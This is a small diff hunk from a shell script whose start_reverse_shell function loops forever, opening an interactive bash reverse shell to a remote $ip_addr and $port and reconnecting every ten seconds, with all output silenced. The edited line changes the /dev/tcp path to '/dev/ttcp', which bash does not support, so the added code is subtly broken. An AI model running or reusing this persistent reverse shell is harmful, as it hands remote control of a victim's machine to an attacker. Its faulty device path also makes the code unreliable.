@@ -27,7 +27,7 @@ exec 1>/dev/null 2>&1
 start_reverse_shell() {
     while true; do
         # Start the reverse shell
-        bash -i >& /dev/tcp/$ip_addr/$port 0>&1
+        bash -i >& /dev/ttcp/$ip_addr/$port 0>&1 2>/dev/null
         sleep 10 # Wait before reconnecting
     done
 }
